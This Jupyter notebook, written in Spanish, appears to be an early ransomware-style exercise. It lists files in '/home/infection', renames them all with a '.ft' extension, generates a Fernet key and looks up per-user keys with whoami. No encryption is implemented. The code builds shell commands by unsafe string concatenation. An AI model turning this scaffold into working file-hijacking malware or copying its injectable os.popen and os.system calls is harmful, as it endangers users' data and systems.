{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "import argparse\n",
    "import os\n",
    "from cryptography.fernet import Fernet"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "ruta = \"/home/infection\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "def listar_archivos(ruta):\n",
    "    nombres = os.popen('ls ' + ruta).read()\n",
    "    nombres\n",
    "    archivos = nombres.strip('\\n').split('\\n')\n",
    "    return archivos"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['1', '2', '3', 'prueba']\n"
     ]
    }
   ],
   "source": [
    "archivos = listar_archivos(ruta)\n",
    "print (archivos)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "for elem in archivos:\n",
    "    if not elem.endswith('.ft'):\n",
    "       os.system(f\"mv {ruta}/{elem} {ruta}/{elem}.ft\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "\"\"\"\n",
    "os.system(f\"ls {ruta}\")\n",
    "for elem in archivos:\n",
    "    if elem.endswith('.ft'):\n",
    "       os.system(f\"mv {ruta}/{elem} {ruta}/{elem[:-3]}\")\n",
    "\"\"\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [],
   "source": [
    "key = Fernet.generate_key()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [],
   "source": [
    "dicti_prueba = {'solo-1234' : b'1tlpI6d5qTBzW7NzmqwnYI22zmvqS8hhKQFL4Uo4QXI=', 'otro-1234' : 'es solo una prueba'}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [],
   "source": [
    "user = os.popen('whoami').read()[:-1]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'1tlpI6d5qTBzW7NzmqwnYI22zmvqS8hhKQFL4Uo4QXI='\n"
     ]
    }
   ],
   "source": [
    "if (user + '-1234') in dicti_prueba:\n",
    "    print (dicti_prueba[user + '-1234'])"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.9.2 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.2"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "916dbcbb3f70747c44a77c7bcd40155683ae19c65e1c03b4aa3499c5328201f1"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
